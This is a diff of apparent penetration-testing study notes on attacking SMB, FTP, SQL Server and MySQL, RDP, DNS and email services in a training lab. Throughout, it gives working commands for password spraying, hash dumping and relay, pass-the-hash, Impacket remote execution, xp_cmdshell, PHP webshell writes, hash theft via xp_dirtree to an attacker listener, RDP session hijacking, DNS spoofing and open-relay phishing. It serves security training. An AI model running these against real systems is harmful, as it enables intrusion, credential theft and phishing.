@@ -1,451 +1,451 @@
+# Attacking Common Services
 
----
+## Interacting with Common Services
 
-## SMB — Enumeration
+To attack a service you need its purpose, its interaction methods, and the right tools. Internal file shares still mean SMB, NFS, FTP, TFTP, SFTP — cloud (S3, Blob, OneDrive, SharePoint) shows up too, but the interaction concepts transfer.
 
-```bash
-sudo nmap 10.129.14.128 -sV -sC -p139,445
+### SMB
 
-# Null session enumeration
-smbclient -N -L //10.129.14.128
-smbmap -H 10.129.14.128                          # list shares + permissions
-smbmap -H 10.129.14.128 -r notes                # recursive browse
-smbmap -H 10.129.14.128 --download "notes\note.txt"
-smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
+Windows GUI: `WINKEY+R` → `\\<IP>\Finance\` — no auth prompt means anonymous access or your current user already has rights.
 
-# RPC null session
-rpcclient -U'%' 10.10.110.17
-rpcclient $> enumdomusers
-
-# Automated null session enum
-./enum4linux-ng.py 10.10.11.45 -A -C
-```
-
----
-
-## SMB — Password Attacks
-
-```bash
-# Password spray with CrackMapExec (netexec)
-crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
-# --continue-on-success = keep spraying after hit
-# --local-auth = non-domain target
-
-# Enumerate logged-on users
-crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
-
-# Dump SAM remotely
-crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
-
-# Pass-the-Hash
-crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
-```
-
----
-
-## SMB — Remote Code Execution
-
-```bash
-# Impacket PsExec (uploads service binary to ADMIN$)
-impacket-psexec administrator:'Password123!'@10.10.110.17
-
-# Impacket SMBExec (no RemComSvc; creates local SMB to receive output)
-impacket-smbexec administrator:'Password123!'@10.10.110.17
-
-# Impacket AtExec (via Task Scheduler)
-impacket-atexec administrator:'Password123!'@10.10.110.17 whoami
-
-# CrackMapExec exec
-crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
-# uppercase -X = PowerShell commands
-```
-
----
-
-## SMB — Forced Auth / NetNTLMv2 Capture
-
-```bash
-# Responder — LLMNR/NBT-NS/MDNS poisoner, captures NTLMv2 hashes
-sudo responder -I ens33
-
-# Captured hashes in /usr/share/responder/logs/
-hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt    # NetNTLMv2 = mode 5600
-
-# NTLM relay instead of cracking
-# 1. Disable SMB in Responder: edit /etc/responder/Responder.conf → SMB = Off
-# 2. Start relay (dumps SAM by default)
-impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
-
-# Relay + exec command (PowerShell reverse shell)
-impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c '<PS_BASE64_CMD>'
-```
-
-> [!tip] NTLMv2 hashes are salted (client+server challenge randomized each session) — multiple hashes for the same user are normal.
-
----
-
-## SMB — Interaction from Windows
+CMD:
 
 ```cmd
-:: Map share
-net use n: \\192.168.220.129\Finance /user:plaintext Password123
-
-:: Count files
-dir n: /a-d /s /b | find /c ":\"
-
-:: Search by filename
-dir n:\*cred* /s /b
-
-:: Search file contents
-findstr /s /i cred n:\*.*
+dir \\<TARGET_IP>\Finance
+net use n: \\<TARGET_IP>\Finance                              :: map as n:
+net use n: \\<TARGET_IP>\Finance /user:plaintext Password123  :: with credentials
+dir n: /a-d /s /b | find /c ":\"                              :: count all files (29302 in the demo)
+dir n:\*cred* /s /b                                           :: filename hunt — try cred, password, users, secrets, key, source extensions (.cs .go .php .asp...)
+findstr /s /i cred n:\*.*                                     :: content hunt
 ```
+
+PowerShell equivalents (runs both cmdlets and Windows commands; CMD only runs the latter):
 
 ```powershell
-# Mount with credentials
-$cred = New-Object System.Management.Automation.PSCredential 'plaintext', (ConvertTo-SecureString 'Password123' -AsPlainText -Force)
-New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
+Get-ChildItem \\<TARGET_IP>\Finance\
 
-# Count files
-(Get-ChildItem -File -Recurse | Measure-Object).Count
+# credentialed mapping via PSCredential object
+$username = 'plaintext'; $password = 'Password123'
+$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
+New-PSDrive -Name "N" -Root "\\<TARGET_IP>\Finance" -PSProvider "FileSystem" -Credential $cred
 
-# Search filename
+(Get-ChildItem -File -Recurse | Measure-Object).Count        :: same count as dir trick
 Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
-
-# Search file content
-Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
+Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List   :: grep equivalent
 ```
 
----
-
-## SMB — Linux Mount
+Linux — mount it and use native tools:
 
 ```bash
+sudo apt install cifs-utils
 sudo mkdir /mnt/Finance
-sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
+sudo mount -t cifs -o username=<USERNAME>,password=<PASSWORD>,domain=. //<TARGET_IP>/Finance /mnt/Finance
+# or: mount -t cifs //<TARGET_IP>/Finance /mnt/Finance -o credentials=/path/credentialfile
+#   (file: username=... / password=... / domain=.)
 
-# Credential file alternative
-mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credfile
-# credfile format: username=X\npassword=X\ndomain=X
-
-# Hunt after mounting
 find /mnt/Finance/ -name *cred*
 grep -rn /mnt/Finance/ -ie cred
 ```
 
----
+### Email
 
-## FTP — Enumeration & Anonymous Access
+Sending = SMTP, receiving = POP3 or IMAP. A GUI client like Evolution handles both (`sudo apt-get install evolution`; if bwrap errors: `export WEBKIT_FORCE_SANDBOX=0 && evolution`). Use domain or IP; pick TLS-on-dedicated-port or STARTTLS to match the server — "Check for Supported Types" confirms.
 
-```bash
-sudo nmap -sC -sV -p 21 192.168.2.142      # ftp-anon script checks anonymous login
+### Databases
 
-# Anonymous login
-ftp 192.168.2.142
-# Name: anonymous, Password: (blank)
-
-# FTP client commands
-ls, cd, get <file>, mget <files>, put <file>, mput <files>, help
-```
-
-**FTP Brute Force:**
+Three ways in: CLI utilities (mysql, sqsh, sqlcmd), programming languages, GUI (HeidiSQL, MySQL Workbench, SSMS — Windows only; dbeaver is the multi-engine cross-platform option):
 
 ```bash
-medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
+sudo dpkg -i dbeaver-<version>.deb
+dbeaver &
 ```
 
-**FTP Bounce Attack** (scan internal hosts via FTP):
+### Tools
+
+Per-service toolbox: SMB → smbclient, CrackMapExec, SMBMap, Impacket (psexec.py, smbexec.py); FTP → ftp, lftp, ncftp, filezilla, crossftp; Email → Thunderbird, Claws, Geary, mutt, swaks, sendEmail; Databases → mssql-cli, mycli, mssqlclient.py, dbeaver.
+
+When access fails, work the checklist: authentication, privileges, network connection, firewall rules, protocol support — then chase the specific error code in documentation/forums.
+
+## The Concept of Attacks
+
+A four-category pattern that maps onto every vulnerability:
+
+- **Source** — where the input comes from: code, libraries, config, APIs, user input. Exploitation happens here.
+- **Processes** — how the input gets handled: PID, input, data processing, variables, logging. Most bugs live here.
+- **Privileges** — what the process is allowed to do: system (SYSTEM/root), user, groups, policies, rules.
+- **Destination** — where results go: local (files, records, local services) or network (remote interfaces).
+
+Log4j (CVE-2021-44228) through this lens, twice around the loop:
+
+1. Attacker puts a JNDI lookup in the User-Agent header (Source) → the library misinterprets the string and executes it instead of logging (Process) → logging paths run with admin privileges (Privileges) → the lookup hits the attacker's server hosting a malicious Java class (Destination).
+2. That class becomes the new Source, its code is loaded and executed (Process), again with admin rights (Privileges), and the callback gives remote control (Destination).
+
+The template works for analyzing exploits, debugging your own, and walking source code.
+
+## Service Misconfigurations
+
+- **Default/weak credentials** — after grabbing the banner, check for vendor defaults, then the classic combos: `admin:admin`, `admin:password`, `admin:<blank>`, `root:12345678`, `administrator:Password`.
+- **Anonymous authentication** — service accepts anyone, no prompt.
+- **Misconfigured access rights** — e.g. an upload-only FTP user who can read every document: configs, plaintext creds, PII. RBAC/ACLs exist for this.
+- **Unnecessary defaults** — settings shipped for usability, not security (OWASP Security Misconfiguration): extra ports/services/pages/accounts enabled, default accounts unchanged, verbose error handling, security features disabled after upgrades.
+
+## Finding Sensitive Information
+
+The module's chain worth internalizing: anonymous FTP yields an empty file named `johnsmith` → try it as email credentials → it works → search the mailbox for "password" → find MSSQL creds → database built-in command execution → RCE. One "insignificant" detail carried the whole chain.
+
+What counts as sensitive: usernames, email addresses, passwords, DNS records, IPs, source code, config files, PII. Two requirements: understand the service, and know what you're looking for (shaped by the target's business and purpose).
+
+## Attacking FTP
+
+TCP/21. Attack paths: misconfigurations, excessive privileges, known/new vulnerabilities — then mine the contents.
 
 ```bash
-nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
-# Requires PORT command not blocked; uses FTP_DMZ to scan Internal_DMZ
+sudo nmap -sC -sV -p 21 <TARGET_IP>     # ftp-anon script checks + lists anonymous-reachable files
+ftp <TARGET_IP>                          # anonymous / no password; ls, cd, get/mget, put/mput
 ```
 
----
+Anonymous + sloppy read/write perms = download sensitive data or upload a payload (paired with a web app path traversal → PHP execution).
 
-## SQL Databases — Enumeration
+**Brute forcing** (when no anonymous):
 
 ```bash
-# MSSQL: TCP/1433 (normal), TCP/2433 (hidden mode), UDP/1434
-# MySQL: TCP/3306
-nmap -Pn -sV -sC -p1433 10.10.10.125
+medusa -u fiona -P rockyou.txt -h <TARGET_IP> -M ftp
 ```
 
----
+Most apps defend against this now — spraying is usually the better bet.
 
-## SQL Databases — Connect
+**FTP bounce attack** — abuse the server's PORT command to reach/scan hosts you can't reach directly (e.g. an internal-only box behind an internet-exposed FTP):
 
 ```bash
-# MSSQL from Linux
-sqsh -S 10.129.20.13 -U username -P Password123
-sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h        # Windows auth
-mssqlclient.py -p 1433 julio@10.129.203.7                   # Impacket
-
-# MySQL from Linux
-mysql -u username -pPassword123 -h 10.10.10.13
-
-# MSSQL from Windows
-sqlcmd -S 10.129.20.13 -U username -P Password123 -y 30 -Y 30
+nmap -Pn -v -n -p80 -b anonymous:password@<FTP_IP> <INTERNAL_IP>
 ```
 
----
+Modern FTP daemons block this by default; misconfiguration reopens it.
 
-## SQL — Essential T-SQL Syntax
+## Attacking SMB
+
+445 = SMB direct over TCP; 139 = SMB over NetBIOS (NBT). Samba is the Unix implementation. MSRPC rides SMB named pipes and is part of the attack surface.
+
+```bash
+sudo nmap <TARGET_IP> -sV -sC -p139,445
+```
+
+On Windows targets version info is usually absent (Nmap guesses); on Samba you get the version directly (e.g. `Samba smbd 4.6.2` → version-specific exploits).
+
+**Null session enumeration:**
+
+```bash
+smbclient -N -L //<TARGET_IP>                 # list shares
+smbmap -H <TARGET_IP>                         # shares + permission per share (READ/WRITE/NO ACCESS)
+smbmap -H <TARGET_IP> -r notes                # browse a share (-R recursive)
+smbmap -H <TARGET_IP> --download "notes\note.txt"
+smbmap -H <TARGET_IP> --upload test.txt "notes\test.txt"
+
+rpcclient -U'%' <TARGET_IP>                   # then: enumdomusers (and much more — SANS rpcclient cheat sheet)
+./enum4linux-ng.py <TARGET_IP> -A -C          # automated: users, groups, shares, OS, password policy
+```
+
+**Brute force / spraying** — brute force risks lockout; spraying one password across a user list is safer (2-3 attempts, 30-60 min apart, if the threshold is known):
+
+```bash
+crackmapexec smb <TARGET_IP> -u userlist.txt -p 'Company01!' --local-auth
+# [+] WIN7BOX\jurena:Company01! (Pwn3d!)
+```
+
+CME stops at first success unless `--continue-on-success`; use `--local-auth` for non-domain-joined targets.
+
+**With admin rights on Windows the surface expands**: remote command execution, SAM hash extraction, logged-on user enumeration, PtH.
+
+RCE — PsExec pattern (uploads a service binary to ADMIN$, starts it via Service Control Manager over DCE/RPC, communicates through a named pipe):
+
+```bash
+impacket-psexec administrator:'<PASSWORD>'@<TARGET_IP>     # same shape: smbexec, atexec (Task Scheduler)
+crackmapexec smb <TARGET_IP> -u Administrator -p '<PASSWORD>' -x 'whoami' --exec-method smbexec   # -X for PowerShell; atexec is the default fallback
+```
+
+```bash
+crackmapexec smb <SUBNET>/24 -u administrator -p '<PASSWORD>' --loggedon-users   # every host at once
+crackmapexec smb <TARGET_IP> -u administrator -p '<PASSWORD>' --sam              # dump local hashes
+crackmapexec smb <TARGET_IP> -u Administrator -H <NTHASH>                        # Pass the Hash
+```
+
+**Forced authentication** — Responder poisons LLMNR/NBT-NS/mDNS. Windows name resolution order: hosts file → DNS cache → DNS server → multicast. A typo'd share name (`\\mysharefoder\`) falls through to multicast, Responder answers, and the victim hands over a NetNTLMv2 hash:
+
+```bash
+sudo responder -I tun0
+# [SMB] NTLMv2-SSP Hash : demouser::WIN7BOX:...
+```
+
+Same account produces different-looking hashes every time (randomized client/server challenges) — they're all the same password. Crack:
+
+```bash
+hashcat -m 5600 hash.txt rockyou.txt
+```
+
+Uncrackable → relay. Disable Responder's own SMB listener first (`/etc/responder/Responder.conf`: `SMB = Off`) so the victim's auth reaches ntlmrelayx instead:
+
+```bash
+impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>          # dumps SAM by default
+impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -e <base64 revshell>'
+```
+
+RPC (beyond enumeration) can change a user's password, create domain users, create shares — given the right configuration/privileges.
+
+## Attacking SQL Databases
+
+High-value targets: creds, PII, payment data, and often high-privileged service accounts. Ports: MSSQL 1433 TCP / 1434 UDP (2433 in "hidden" mode), MySQL 3306.
+
+```bash
+nmap -Pn -sV -sC -p1433 <TARGET_IP>      # ms-sql-info + ms-sql-ntlm-info leak version, hostname, domain
+```
+
+MSSQL auth: Windows authentication mode (integrated with AD, default) or Mixed mode (SQL-local accounts too). Historical note: CVE-2012-2122 let MySQL 5.6.x auth be bypassed by timing — repeated identical wrong passwords eventually "succeeded."
+
+**Clients:**
+
+```bash
+mysql -u julio -p'<PASSWORD>' -h <TARGET_IP>
+sqlcmd -S <TARGET_IP> -U julio -P '<PASSWORD>' -y 30 -Y 30          # Windows; -y/-Y = display widths
+sqsh -S <TARGET_IP> -U julio -P '<PASSWORD>' -h                      # Linux; -h strips headers
+sqsh -S <TARGET_IP> -U .\\julio -P '<PASSWORD>' -h                   # .\ or HOSTNAME\ = Windows/local auth
+mssqlclient.py -p 1433 julio@<TARGET_IP>                             # Impacket
+```
+
+Default databases worth knowing — MySQL: `mysql`, `information_schema`, `performance_schema`, `sys`. MSSQL: `master`, `msdb`, `model`, `resource`, `tempdb`. These enumerate structure; company data lives elsewhere.
+
+**Enumeration syntax** (sqlcmd needs `GO` to execute):
 
 ```sql
--- MSSQL
-SELECT name FROM master.dbo.sysdatabases; GO
-USE htbusers; GO
-SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES; GO
-SELECT * FROM users; GO
-
--- MySQL
-SHOW DATABASES;
+SHOW DATABASES;                                    -- mysql
+SELECT name FROM master.dbo.sysdatabases           -- mssql
 USE htbusers;
-SHOW TABLES;
+SHOW TABLES;                                       -- mysql
+SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES   -- mssql
 SELECT * FROM users;
 ```
 
----
-
-## SQL — Command Execution
+**Command execution** — MSSQL's xp_cmdshell (disabled by default; spawned process runs as the SQL service account):
 
 ```sql
--- MSSQL: xp_cmdshell (disabled by default)
 xp_cmdshell 'whoami'
-GO
-
--- Enable xp_cmdshell (needs sysadmin)
-EXECUTE sp_configure 'show advanced options', 1; GO; RECONFIGURE; GO
-EXECUTE sp_configure 'xp_cmdshell', 1; GO; RECONFIGURE; GO
 ```
 
----
+```sql
+EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+```
 
-## SQL — File Read / Write
+Other paths: custom extended procedures, CLR assemblies, Agent jobs, external scripts, `xp_regwrite` for registry-based privesc. MySQL: User Defined Functions can run C/C++ — a command-exec UDF exists but is rare in production.
+
+**Write files:**
 
 ```sql
--- MSSQL read file
-SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
-GO
-
--- MySQL read (needs FILE priv + secure_file_priv='')
-SELECT LOAD_FILE("/etc/passwd");
-
--- Check secure_file_priv (empty = unrestricted)
-SHOW VARIABLES LIKE "secure_file_priv";
-
--- MySQL write webshell
+-- MySQL: webshell into a webroot (needs FILE privilege; check secure_file_priv: empty = no limit, NULL = disabled)
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+show variables like "secure_file_priv";
+```
 
--- MSSQL write file (needs Ole Automation enabled)
-sp_configure 'Ole Automation Procedures', 1; GO; RECONFIGURE; GO
-DECLARE @OLE INT; DECLARE @FileID INT
+```sql
+-- MSSQL: enable Ole Automation Procedures (admin), then Scripting.FileSystemObject
+sp_configure 'show advanced options', 1; RECONFIGURE;
+sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+DECLARE @OLE INT; DECLARE @FileID INT;
 EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
 EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
 EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
-EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE; GO
+EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE;
 ```
 
----
-
-## SQL — Capture MSSQL Service Hash (xp_dirtree / xp_subdirs)
-
-MSSQL connects to attacker SMB via `xp_dirtree`/`xp_subdirs` → sends NTLMv2 hash of service account.
+**Read files:**
 
 ```sql
--- Both work; point to attacker's SMB server
-EXEC master..xp_dirtree '\\10.10.110.17\share\'; GO
-EXEC master..xp_subdirs '\\10.10.110.17\share\'; GO
+-- MSSQL: any file the service account can read
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+-- MySQL (with FILE privilege + secure_file_priv allowing it):
+select LOAD_FILE("/etc/passwd");
 ```
+
+**Steal the service account hash** — xp_dirtree/xp_subdirs do SMB directory listing; point them at your listener:
 
 ```bash
-# Catch hash with Responder
-sudo responder -I tun0
-hashcat -m 5600 hash.txt rockyou.txt
-
-# Or impacket SMB server
-sudo impacket-smbserver share ./ -smb2support
+sudo responder -I tun0        # or: sudo impacket-smbserver share ./ -smb2support
 ```
 
----
+```sql
+EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
+EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
+```
 
-## SQL — Impersonation & Linked Servers
+Crack or relay the resulting NetNTLMv2.
+
+**IMPERSONATE** — escalate inside MSSQL without leaving SQL:
 
 ```sql
--- Find users we can impersonate
-SELECT distinct b.name
-FROM sys.server_permissions a
+SELECT distinct b.name FROM sys.server_permissions a
 INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
-WHERE a.permission_name = 'IMPERSONATE'
-GO
+WHERE a.permission_name = 'IMPERSONATE';
+-- returns sa, ben, valentin...
 
--- Check current user + sysadmin role (0=no, 1=yes)
-SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin'); GO
-
--- Impersonate sa
-EXECUTE AS LOGIN = 'sa'
-SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin'); GO
-REVERT  -- revert impersonation
-
--- Note: run EXECUTE AS LOGIN within master DB to avoid access errors
-
--- Find linked servers (isremote=1 = remote, 0 = linked)
-SELECT srvname, isremote FROM sysservers; GO
-
--- Execute query on linked server
-EXECUTE('select @@servername, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
-GO
--- Use semicolons to chain multiple commands
+SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');   -- 0 = not sysadmin
+USE master;                                                 -- impersonate from master; other DBs may error
+EXECUTE AS LOGIN = 'sa';
+SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');   -- sa, 1
+REVERT;
 ```
 
----
+**Linked servers** — lateral movement between SQL instances. If the link's credentials are sysadmin there, you own that instance:
 
-## RDP — Enumeration & Attacks
+```sql
+SELECT srvname, isremote FROM sysservers;    -- isremote 1 = remote, 0 = linked
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS];
+-- escape single quotes by doubling; chain commands with ;
+```
+
+Then xp_cmdshell on the far side. PostgreSQL, SQLite, Oracle, Firebase, MongoDB have their own attack profiles — worth reading beyond this module.
+
+## Attacking RDP
+
+TCP/3389:
 
 ```bash
-nmap -Pn -p3389 192.168.2.143
-
-# Password spray
-crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
-hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp -t 4 -W 3
-
-# Connect
-rdesktop -u admin -p password123 192.168.2.142
-xfreerdp /v:192.168.220.152 /u:lewen /p:password123
+nmap -Pn -p3389 <TARGET_IP>
 ```
 
-**RDP Pass-the-Hash:**
+Password guessing risks lockout — spray instead:
 
 ```bash
-# Requires DisableRestrictedAdmin = 0 on target
-reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
-
-xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+crowbar -b rdp -s <TARGET_IP>/32 -U users.txt -c 'password123'
+hydra -L usernames.txt -p 'password123' <TARGET_IP> rdp     # mind the -t 1/-t 4 warnings
+rdesktop -u admin -p '<PASSWORD>' <TARGET_IP>                # or xfreerdp
 ```
 
-**RDP Session Hijacking** (requires SYSTEM on target):
+**RDP session hijacking** — local admin on a box where a juicier user has an active RDP session? Connect into their session with tscon (needs SYSTEM):
 
 ```cmd
-query user                           # find target SESSION_ID + our session name
+query user
+::  juurena  rdp-tcp#13  1  Active
+::  lewen    rdp-tcp#14  2  Active
+tscon 2 /dest:rdp-tcp#13                       :: direct, if already SYSTEM
 
-# Create service that runs tscon as SYSTEM
-sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>"
+:: from local admin: service trick to get SYSTEM
+sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
 net start sessionhijack
 ```
 
-> [!warning] Session hijacking via `sc.exe` + `tscon` no longer works on Windows Server 2019. Requires local admin → SYSTEM (PsExec, Mimikatz, etc.) first.
+A console as the target user appears. Dead on Server 2019.
 
----
+**RDP PtH** — GUI access with only an NT hash. Restricted Admin Mode must be enabled (default off, else "Account restrictions..." error):
 
-## DNS — Zone Transfer & Subdomain Enumeration
+```cmd
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
 
 ```bash
-# Zone transfer
+xfreerdp /v:<TARGET_IP> /u:lewen /pth:<NTHASH>
+```
+
+Doesn't work everywhere, but with a hash + RDP rights + a GUI-shaped goal, always try it.
+
+## Attacking DNS
+
+UDP/53 default, TCP/53 fallback (large responses). Attacks here hit nearly every application.
+
+```bash
+nmap -p53 -Pn -sV -sC <TARGET_IP>
+```
+
+**Zone transfer** — AXFR needs no authentication; misconfigured servers hand the whole zone to anyone:
+
+```bash
 dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
-fierce --domain zonetransfer.me                    # auto-enumerate + attempt AXFR
+fierce --domain zonetransfer.me          # enumerates NS/SOA and tries the transfer
+```
 
-# Subdomain enumeration
-./subfinder -d inlanefreight.com -v
-./subbrute.py inlanefreight.com -s names.txt -r resolvers.txt   # internal (no internet needed)
+**Subdomain takeover** — CNAME pointing at an expired/claimable third-party (AWS, GitHub, Akamai, Fastly):
 
-# Check CNAME for subdomain takeover candidate
+```text
+sub.target.com.  60  IN  CNAME  anotherdomain.com
+```
+
+Claim `anotherdomain.com` → control `sub.target.com` until DNS is fixed.
+
+Enumeration first:
+
+```bash
+./subfinder -d inlanefreight.com -v                          # passive scraping of public sources
+# pure brute force, works internally without internet:
+git clone https://github.com/TheRook/subbrute.git && cd subbrute
+echo "ns1.inlanefreight.com" > ./resolvers.txt
+./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
+
 host support.inlanefreight.com
-# If alias points to expired S3/CDN → potential takeover
-
-# Reference: https://github.com/EdOverflow/can-i-take-over-xyz
+# "is an alias for inlanefreight.s3.amazonaws.com" → browse it; NoSuchBucket = takeover candidate (claim the S3 bucket name)
 ```
 
-**DNS Cache Poisoning (local network via Ettercap):**
+The can-i-take-over-xyz repo tracks which services are actually vulnerable.
 
-```bash
-# Edit /etc/ettercap/etter.dns:
-# inlanefreight.com    A   192.168.225.110
-# *.inlanefreight.com  A   192.168.225.110
+**DNS spoofing / cache poisoning** — MITM the resolver path or exploit the DNS server. Locally with Ettercap: map targets in `/etc/ettercap/etter.dns`:
 
-ettercap  # Hosts > Scan → add target to Target1, gateway to Target2
-          # Plugins > Manage > dns_spoof → activate
+```text
+inlanefreight.com      A   <ATTACKER_IP>
+*.inlanefreight.com    A   <ATTACKER_IP>
 ```
 
----
+Then Hosts > Scan for Hosts → victim to Target1, gateway to Target2 → Plugins > dns_spoof. Victim's `ping inlanefreight.com` now resolves to you.
 
-## Email (SMTP/IMAP/POP3) — Enumeration
+## Attacking Email Services
 
-**Identify mail server:**
+Flow: client → SMTP → server → SMTP → server → IMAP/POP3 → client. POP3 deletes on download by default; IMAP keeps server-side.
+
+Find the mail provider via MX:
 
 ```bash
-host -t MX hackthebox.eu
-dig mx inlanefreight.com | grep "MX" | grep -v ";"
-
-# Nmap scan common mail ports
-sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
+host -t MX hackthebox.eu         # aspmx.l.google.com → G-Suite
+host -t MX microsoft.com         # ...outlook.com → Microsoft 365
+dig mx plaintext.do | grep "MX" | grep -v ";"
+host -t A mail1.inlanefreight.htb.
 ```
 
-**SMTP user enumeration (manual):**
+Cloud vs self-hosted decides the attack path. Custom mail server ports: 25 (SMTP), 110 (POP3), 143 (IMAP4), 465 (SMTPS), 587 (SMTP STARTTLS), 993 (IMAPS), 995 (POP3S):
 
 ```bash
-telnet 10.10.110.20 25
-VRFY root            # 252 = exists, 550 = unknown
-EXPN support-team    # lists distribution list members
-MAIL FROM:test@htb.com
-RCPT TO:john         # 250 = exists, 550 = unknown
+sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <TARGET_IP>
 ```
 
-**POP3 user enum:**
+**Username enumeration** over SMTP (telnet), then spray/brute/guess:
 
-```bash
-telnet 10.10.110.20 110
-USER julio           # -ERR = unknown, +OK = exists
+```text
+VRFY root        → 252 (exists) / 550 (unknown)
+EXPN support-team → lists every member of the alias
+MAIL FROM:test@htb.com → RCPT TO:john → 250 (valid recipient) / 550 (unknown)
 ```
 
-**Automated SMTP user enum:**
+POP3: `USER john` → +OK / -ERR. Automate:
 
 ```bash
-smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
-# Modes: VRFY, EXPN, RCPT
+smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t <TARGET_IP>
 ```
 
-**O365 enumeration:**
+**Cloud (Office 365)**:
 
 ```bash
-python3 o365spray.py --validate --domain msplaintext.xyz     # confirm O365
+python3 o365spray.py --validate --domain msplaintext.xyz
 python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
-```
-
----
-
-## Email — Password Attacks
-
-```bash
-# Hydra against POP3/IMAP/SMTP
-hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
-hydra -L users.txt -P passwords.txt 10.10.110.20 smtp
-
-# O365 password spray
 python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
-# --count = passwords per spray, --lockout = minutes between rounds
-
-# CredKing for Gmail/Okta
-# MailSniper for Exchange/O365
 ```
 
----
+Cloud providers block Hydra-style protocols attacks; custom tools (o365spray, MailSniper for O365, CredKing for Gmail/Okta) target the APIs — and break whenever providers change behavior, so know what your tool does.
 
-## Email — Open Relay (SMTP Phishing)
+**On-prem password attacks:**
 
 ```bash
-# Detect open relay
-nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
-
-# Send phishing email through open relay
-swaks --from notifications@inlanefreight.com \
-      --to employees@inlanefreight.com \
-      --header 'Subject: Company Notification' \
-      --body 'Click: http://phish.example.com/' \
-      --server 10.10.11.213
+hydra -L users.txt -p 'Company01!' -f <TARGET_IP> pop3     # also smtp / imap
 ```
 
----
+**Open relay** — unauthenticated SMTP relay = phishing as anyone (spoof a real internal notification address):
 
-> [!tip] Chain of discovery: anonymous FTP → find username → try against email → find DB creds in inbox → xp_cmdshell → RCE. Every piece of information (even an empty file named `johnsmith`) is a pivot point.
-
-> [!warning] Password spraying against AD accounts: default lockout policy may not exist, but if it does, 2-3 attempts safe with 30-60 min gap. MSSQL xp_dirtree hash capture also works via vulnerable web apps with SQLi — not just direct DB connections.
+```bash
+nmap -p25 -Pn --script smtp-open-relay <TARGET_IP>
+swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, ... http://mycustomphishinglink.com/' --server <TARGET_IP>
+```
